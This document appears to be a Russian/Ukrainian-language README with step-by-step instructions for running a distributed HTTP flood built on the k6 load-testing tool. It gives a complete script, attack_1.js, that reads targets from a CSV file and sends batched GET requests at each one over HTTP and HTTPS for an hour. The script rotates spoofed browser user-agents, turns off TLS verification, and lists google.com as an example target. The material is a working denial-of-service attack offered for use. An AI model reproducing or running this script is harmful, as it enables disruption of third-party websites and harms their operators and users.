якщо у вас мак, то устанапвливаем k6 через 
```
brew install k6
```
создайте новый файл ./attack_1.js

вставьте этот листинг

```
import { check } from 'k6';
import http from 'k6/http';

export let options = {
  insecureSkipTLSVerify: true,
  noConnectionReuse: true,
  vus: 10, // target
  duration: '60m',
  dns: {
    'ttl': '0s',
    'select': 'roundRobin',
    'policy': 'onlyIPv4',
  },
}

const userAgents = [
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
	'(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
	'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
	'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50',
	'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)',
	'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
]

const content = open('./targets.csv')

export default function() {
  const lines = content.split('\n')

  const targets = {}
  for (let line of lines) {
    if (line === '' || line === '\n') {
      continue
    }

    const row = line.split(';').reverse()
    const uri = row.pop()
    const ip = row.pop()
    for (let port of row) {
      if (port === '8080' || port === '443' || port === '80' || port === '8000' || port === '' || !port) {
        targets[ip] = uri
      }
    }
  }

  let reqs = []

  for (let k in targets) {
    let agentIndex1 = Math.floor(Math.random() * userAgents.length);
    reqs.push(
      {
        'method': 'GET',
        'url': `https://${k}`,
        'params': {
          'headers': {
            'Host': `${targets[k]}`,
            'referrer': "",
            'user-agent': userAgents[agentIndex1]
          }
        }
      }
    )
    let agentIndex2 = Math.floor(Math.random() * userAgents.length);
    reqs.push(
      {
        'method': 'GET',
        'url': `http://${k}`,
        'params': {
          'headers': {
            'Host': `${targets[k]}`,
            'referrer': "",
            'user-agent': userAgents[agentIndex1]
          }
        }
      }
    )
  }
  http.batch(reqs);
};


```

добавьте список целей в `./targets.csv` и сохраните его в тойже папке в формате

```
localhost;127.0.0.1;
google.com;172.217.19.78;443;80;8080;

```

запустите

```
k6 run ./attack_1.js
```





на другие ОС





```
git clone https://github.com/grafana/k6.git
cd k6
```

создайте новый файл ./samples/attack_1.js

вставьте тот же листинг

запустите

```
k6 run ./samples/attack_1.js
```
